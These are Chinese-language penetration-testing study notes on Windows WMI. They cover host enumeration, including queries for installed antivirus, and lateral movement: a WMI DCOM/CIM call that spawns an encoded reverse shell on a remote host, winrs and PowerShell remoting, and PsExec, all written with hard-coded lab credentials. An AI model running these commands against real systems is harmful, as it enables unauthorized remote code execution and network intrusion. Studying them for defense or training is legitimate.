# WMI
WMI 是 Windows 操作系统的功能，默认情况下，无须安装就可以使用。某些 Provider(提供程序)的安装会由系统配置而定。
在 Powershell 未发布前用来管理 Windows 2000、Windows 95、Windows 98、WindowsNT 等操作系统，当然如今的所有 Windows 系统依旧可以使用 WMI 来进行管理。
(不论 Powershell、VBScript 或者其他什么语言，其本质还是使用.NET 来访问 WMI 的类库，都是因为 WMI 向外暴露的一组 API，然后进行管理，Powershell 的发布只是让我们管理的方式多了一种，本质上没有改变去使用 WMI。)


## 使用WMI枚举
`Get-WmiObject -Class __namespace -Namespace root | select name`   Powershell查询命名空间
`Get-WmiObject -Class  Win32_BIOS`    显示bois
`Get-WmiObject -Class  Win32_Operatingsystem`   Powershell查询计算机信息
查询windows机器版本和服务位数和.net版本
`wmic os get caption`
`wmic os get osarchitecture`
`wmic OS get Caption,CSDVersion,OSArchitecture,Version`
查询本机所有盘符
`fsutil fsinfo drives`
`shell wmic logicaldisk list brief`
`shell wmic logicaldisk get description,name,size,freespace /value`
查看系统中⽹卡的IP地址和MAC地址
`wmic nicconfig get ipaddress,macaddress`
⽤户列表
`wmic useraccount list brief`
查看当前系统是否有屏保保护，延迟是多少
`wmic desktop get screensaversecure,screensavertimeout`
域控机器
`wmic ntdomain list brief`
查询杀软
`wmic /namespace:\\root\securitycenter2 path antispywareproduct GET displayName,productState, pathToSignedProductExe && wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe`
查询启动项
`wmic startup list brief |more`
获取打补丁信息
`wmic qfe list`
启动的程序
`wmic startup list brief`
启动的程序
`wmic startup list full`



## 利用WMI横向移动
Windows Management Instrumentation (WMI) 是 Microsoft 对基于 Web 的企业管理 (WBEM) 的实现，WBEM 是一项业界倡议，用于为访问企业环境中的管理信息开发一项标准技术。 **WMI 使用通用信息模型 (CIM) 行业标准来表示系统、应用程序、网络、设备和其他托管组件**。
利用WMI控制远程主机主要使用两种方法：第一使用DCOM协议与远程计算机建立连接，第二使用winrm远程管理来控制计算机


### 使用WMI中DCOM协议横向移动
首先创建PSCredential用于CIM通用信息模型，来与远程WMI进行沟通，然后使用python反弹脚本注入远程主机，获得远程主机shell 
`$username='jen';`
`$password='Nexus123!';`
`$secureString=ConvertTo-SecureString $password -AsPlaintext -Force;`
`$credential=New-Object System.Management.Automation.PSCredential $username,$secureString;` 
创建CIM信息模型
`$option=New-CimSessionOption -Protocol DCOM;`
`$session=New-CimSession -ComputerName 192.158.100.10 -Credential $credential -SessionOption $option;` 
为了避免出现坏字符，使用base64加密反弹shell
使用CIM模型对远程WMI进行控制
`$command='python encode payload';`
`Invoke-CimMethod -CimSession $session -ClassName win32_Process -MethodName Create -Arguments @{CommandLine=$command};`
这时远程主机会利用win32_process创建进程，将反弹shell注入其中执行，获得远程主机控制权限


### 使用WINRM横向移动
除了使用DCOM协议远程控制WMI以外，也可以使用winrm让远程机器执行反弹shell 
`winrs -r:file04 -u:jen -p:Nexus123! "python encode payload"`
或者使用powershell版本的winrm控制远程WMI
`$username='jen';`
`$password='Nexus123!';`
`$secureString=ConvertTo-SecureString $password -AsPlaintext -Force;`
`$credential=New-Object System.Management.Automation.PSCredential $username,$secureString;`
`New-PSSession -ComputerName 192.168.100.10 -Credential $credential;`
利用enter-pssession进入命令行控制
`Enter-PSSession 1`



# 使用PsExec工具横向移动
PsExec利用在ADMIN$共享中在C:\Windows中写入psexesvc.exe，并且将创建一个服务，作为 psexesvc.exe 的子进程运行请求的命令
所以使用PsExec工具前要满足三个条件：
（1）使用PsExec工具的用户必须属于本地管理员组（域用户不行）
（2）目标机器共享ADMIN$
（3）必须打开文件和打印机共享
`.\PsExec64.exe -i \\FILE04  -u corp\jen -p abc123 cmd`
会利用PsExec开启一个CMD


